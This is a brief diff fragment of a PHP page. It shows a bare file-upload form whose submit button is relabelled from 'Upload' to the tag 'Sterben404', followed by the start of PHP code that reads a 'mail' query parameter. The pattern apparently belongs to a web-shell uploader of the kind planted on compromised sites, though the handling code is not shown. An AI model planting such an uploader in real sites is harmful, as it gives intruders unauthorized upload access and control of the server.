@@ -1,6 +1,6 @@
 <form action='' method='post' enctype='multipart/form-data' name='uploader' id='uploader'>
 	<input type='file' name='file' size='50'>
-	<input name='_upl' type='submit' id='_upl' value='Upload'>
+	<input name='_upl' type='submit' id='_upl' value='Sterben404'>
 </form>
 <?php
 if (isset($_GET['mail'])) {
